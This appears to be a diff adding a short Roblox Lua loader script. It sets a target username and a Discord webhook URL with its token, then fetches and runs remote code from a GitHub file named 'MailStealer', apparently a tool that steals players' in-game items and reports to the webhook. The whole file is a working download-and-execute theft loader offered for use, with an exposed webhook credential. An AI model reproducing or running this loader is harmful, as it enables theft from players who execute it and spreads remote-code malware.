@@ -1,0 +1,4 @@
+_G.UserNamey = "Jason75ke57"
+_G.Webhooky = "https://discord.com/api/webhooks/1118590586178506913/OjE1yUxM88ysRH_HZJORKecIZSRo-RpnM8UDbhQ_98sat1vz0_AiR2AB8pbEUqESGwfZ"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
